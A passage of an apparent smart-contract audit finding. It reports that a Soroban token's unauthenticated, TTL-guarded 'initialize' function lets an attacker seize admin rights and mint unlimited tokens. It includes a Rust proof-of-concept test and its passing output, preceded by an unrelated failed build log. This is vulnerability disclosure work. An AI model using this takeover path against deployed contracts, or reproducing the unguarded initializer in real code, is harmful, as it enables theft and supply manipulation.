  = help: if you wanted to use a crate named `k2_price_oracle`, use `cargo add k2_price_oracle` to add it to your `Cargo.toml`

error[E0432]: unresolved import `k2_treasury`
  --> contracts/token/src/test.rs:11:5
   |
11 | use k2_treasury::{TreasuryContract, TreasuryContractClient};
   |     ^^^^^^^^^^^ use of unresolved module or unlinked crate `k2_treasury`
   |
   = help: if you wanted to use a crate named `k2_treasury`, use `cargo add k2_treasury` to add it to your `Cargo.toml`

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/token/src/contract.rs:45:22
   |
45 |         env.events().publish(
   |                      ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/token/src/contract.rs:85:14
   |
85 |             .publish((symbol_short!("transfer"), from, to), amount);
   |              ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:132:14
    |
132 |             .publish((symbol_short!("transfer"), from, to), amount);
    |              ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:151:22
    |
151 |         env.events().publish((symbol_short!("burn"), from), amount);
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:185:22
    |
185 |         env.events().publish((symbol_short!("burn"), from), amount);
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:235:22
    |
235 |         env.events().publish((symbol_short!("mint"), to), amount);
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::Env::budget`: use cost_estimate().budget()
   --> contracts/token/src/test.rs:204:9
    |
204 |     env.budget().reset_unlimited();
    |         ^^^^^^

For more information about this error, try `rustc --explain E0432`.
warning: `k2_token` (lib test) generated 7 warnings
error: could not compile `k2_token` (lib test) due to 8 previous errors; 7 warnings emitted
```

---

# Unauthenticated reinitialization enables admin takeover and infinite mint
**#44869**
- Severity: Critical
- Validity: Unreviewed

## Targets
- TokenContract::initialize
- TokenContract::mint
- storage::has_admin

## Affected Locations
- **TokenContract.initialize**: `initialize` relies only on `storage::has_admin(&env)` to decide whether setup is allowed, but never authenticates the supplied `admin` before writing privileged state.
- **TokenContract.mint**: After taking over admin rights through reinitialization, the attacker can call `mint` to create arbitrary token supply.
- **storage.has_admin**: `has_admin` is backed by an expiring instance-storage admin key, so once that TTL lapses it can return false again and reopen initialization on an already deployed token.

## Description

The token's setup flow can be hijacked because `initialize` accepts any caller and only checks whether `storage::has_admin(&env)` is currently true before installing the provided `admin`. That creates an immediate first-caller race on any freshly deployed but uninitialized instance, allowing an arbitrary account to become the mint authority. The same flaw can recur later because the admin and metadata are stored in instance storage with a TTL, while ordinary token activity does not refresh that admin marker. If the admin key expires, `has_admin` becomes false again and `initialize` can be called a second time by an attacker. Once reinstalled as admin, the attacker gains the same privileged capabilities as the legitimate owner, including arbitrary minting.

## Root Cause

`initialize` uses the presence of an expiring `Admin` storage entry as its only guard instead of enforcing authenticated one-time initialization tied to a non-expiring privilege model.

## Impact

An attacker can take control of an uninitialized token or reclaim control of a live token after the admin marker expires. With admin rights, they can mint unlimited tokens to themselves, corrupt supply assumptions, and potentially extract value from users or integrations that trust the asset.

## Proof of Concept

### Test Case

```
#![cfg(test)]

use crate::contract::TokenContractClient;

use super::*;
use soroban_sdk::{testutils::{Address as _, MockAuth, MockAuthInvoke}, Address, Env, IntoVal, String};

#[test]
fn test_initialize() {
    let env = Env::default();
    let admin = Address::generate(&env);
    let name = String::from_str(&env, "USD Coin");
    let symbol = String::from_str(&env, "USDC");
    let decimals = 6u32;

    let contract_id = env.register(TokenContract, ());
    let client = TokenContractClient::new(&env, &contract_id);

    client.initialize(&admin, &name, &symbol, &decimals);

    assert_eq!(client.name(), name);
    assert_eq!(client.symbol(), symbol);
    assert_eq!(client.decimals(), decimals);
    assert_eq!(client.admin(), admin);
}

#[test]
fn test_mint() {
    let env = Env::default();
    
    let admin = Address::generate(&env);
    let user = Address::generate(&env);
    let name = String::from_str(&env, "USD Coin");
    let symbol = String::from_str(&env, "USDC");
    let decimals = 6u32;

    let contract_id = env.register(TokenContract, ());
    let client = TokenContractClient::new(&env, &contract_id);

    client.initialize(&admin, &name, &symbol, &decimals);

    // Mock only admin's auth for the mint call
    env.mock_auths(&[MockAuth {
        address: &admin,
        invoke: &MockAuthInvoke {
            contract: &contract_id,
            fn_name: "mint",
            args: (&user, 1000000_i128).into_val(&env),
            sub_invokes: &[],
        },
    }]);

    // Mint tokens to user (admin must authorize)
    client.mint(&user, &1000000);

    assert_eq!(client.balance(&user), 1000000);
}

#[test]
fn test_transfer() {
    let env = Env::default();
    env.mock_all_auths();
    
    let admin = Address::generate(&env);
    let user1 = Address::generate(&env);
    let user2 = Address::generate(&env);
    let name = String::from_str(&env, "USD Coin");
    let symbol = String::from_str(&env, "USDC");
    let decimals = 6u32;

    let contract_id = env.register(TokenContract, ());
    let client = TokenContractClient::new(&env, &contract_id);

    client.initialize(&admin, &name, &symbol, &decimals);

    // Mint tokens to user1
    client.mint(&user1, &1000000);

    // Transfer from user1 to user2 (user1 must authorize)
    client.transfer(&user1, &user2, &500000);

    assert_eq!(client.balance(&user1), 500000);
    assert_eq!(client.balance(&user2), 500000);
}

#[test]
fn test_approve_and_transfer_from() {
    let env = Env::default();
    env.mock_all_auths();
    
    let admin = Address::generate(&env);
    let user1 = Address::generate(&env);
    let user2 = Address::generate(&env);
    let spender = Address::generate(&env);
    let name = String::from_str(&env, "USD Coin");
    let symbol = String::from_str(&env, "USDC");
    let decimals = 6u32;

    let contract_id = env.register(TokenContract, ());
    let client = TokenContractClient::new(&env, &contract_id);

    client.initialize(&admin, &name, &symbol, &decimals);

    // Mint tokens to user1
    client.mint(&user1, &1000000);

    // Approve spender to spend user1's tokens (user1 must authorize)
    client.approve(&user1, &spender, &500000, &1000);

    assert_eq!(client.allowance(&user1, &spender), 500000);

    // Transfer from user1 to user2 using spender (spender must authorize)
    client.transfer_from(&spender, &user1, &user2, &300000);

    assert_eq!(client.balance(&user1), 700000);
    assert_eq!(client.balance(&user2), 300000);
    assert_eq!(client.allowance(&user1, &spender), 200000);
}

#[test]
fn test_harness_smoke_placeholder() {
    let env = Env::default();
    env.mock_all_auths();

    let admin = Address::generate(&env);
    let user = Address::generate(&env);
    let name = String::from_str(&env, "Harness Token");
    let symbol = String::from_str(&env, "HRN");
    let decimals = 7u32;

    let contract_id = env.register(TokenContract, ());
    let client = TokenContractClient::new(&env, &contract_id);

    client.initialize(&admin, &name, &symbol, &decimals);
    client.mint(&user, &123);

    assert_eq!(client.admin(), admin);
    assert_eq!(client.name(), name);
    assert_eq!(client.symbol(), symbol);
    assert_eq!(client.decimals(), decimals);
    assert_eq!(client.balance(&user), 123);
}

#[test]
fn test_initialize_is_unauthenticated_admin_takeover_poc() {
    let env = Env::default();

    let legitimate_admin = Address::generate(&env);
    let attacker = Address::generate(&env);
    let recipient = Address::generate(&env);
    let name = String::from_str(&env, "Reward Token");
    let symbol = String::from_str(&env, "RWD");
    let decimals = 7u32;

    let contract_id = env.register(TokenContract, ());
    let client = TokenContractClient::new(&env, &contract_id);

    // No auth is provided here. The first external caller can initialize the token
    // with an attacker-controlled admin address and seize mint authority.
    client.initialize(&attacker, &name, &symbol, &decimals);

    assert_eq!(client.admin(), attacker);
    assert_ne!(client.admin(), legitimate_admin);

    env.mock_auths(&[MockAuth {
        address: &attacker,
        invoke: &MockAuthInvoke {
            contract: &contract_id,
            fn_name: "mint",
            args: (&recipient, 1_000_000_i128).into_val(&env),
            sub_invokes: &[],
        },
    }]);

    client.mint(&recipient, &1_000_000);

    assert_eq!(client.balance(&recipient), 1_000_000);
}
```

### Setup Script

```
#!/bin/bash
set -e

# install dependencies
rustup default stable
```

### Output

```
running 1 test
test test::test_initialize_is_unauthenticated_admin_takeover_poc ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 5 filtered out; finished in 0.03s

warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/kinetic-router/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/a-token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/debt-token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/interest-rate-strategy/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/price-oracle/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/pool-configurator/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/liquidation-engine/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/incentives/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/treasury/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/flash-liquidation-helper/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/aquarius-swap-adapter/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/soroswap-swap-adapter/Cargo.toml
workspace: /repo/Cargo.toml
warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/shared/src/upgradeable.rs:67:26
   |
67 |             env.events().publish(
   |                          ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/shared/src/upgradeable.rs:81:22
   |
81 |         env.events().publish(
   |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/shared/src/upgradeable.rs:107:22
    |
107 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/shared/src/upgradeable.rs:129:22
    |
129 |         env.events().publish(
    |                      ^^^^^^^

warning: unused variable: `reported_amount_out`
   --> contracts/shared/src/dex.rs:416:9
    |
416 |     let reported_amount_out: u128 = call_soroswap(
    |         ^^^^^^^^^^^^^^^^^^^ help: if this is intentional, prefix it with an underscore: `_reported_amount_out`
    |
    = note: `#[warn(unused_variables)]` (part of `#[warn(unused)]`) on by default

warning: `k2-shared` (lib) generated 5 warnings (run `cargo fix --lib -p k2-shared` to apply 1 suggestion)
   Compiling k2_token v0.1.0 (/repo/contracts/token)
warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/token/src/contract.rs:45:22
   |
45 |         env.events().publish(
   |                      ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/token/src/contract.rs:85:14
   |
85 |             .publish((symbol_short!("transfer"), from, to), amount);
   |              ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:132:14
    |
132 |             .publish((symbol_short!("transfer"), from, to), amount);
    |              ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:151:22
    |
151 |         env.events().publish((symbol_short!("burn"), from), amount);
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:185:22
    |
185 |         env.events().publish((symbol_short!("burn"), from), amount);
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:235:22
    |
235 |         env.events().publish((symbol_short!("mint"), to), amount);
    |                      ^^^^^^^

warning: `k2_token` (lib test) generated 6 warnings
    Finished `test` profile [unoptimized + debuginfo] target(s) in 7.09s
     Running unittests src/lib.rs (target/debug/deps/k2_token-e74658dc392f3ea0)
Writing test snapshot file for test "test::test_initialize_is_unauthenticated_admin_takeover_poc" to "test_snapshots/test/test_initialize_is_unauthenticated_admin_takeover_poc.1.json".
```

### Considerations

PoC successfully demonstrates the verified public-entry-point exploit path on a freshly deployed, uninitialized TokenContract: an attacker calls initialize with their own address as admin, then mints arbitrary supply via mint. It does not demonstrate the separate post-TTL reinitialization variant.
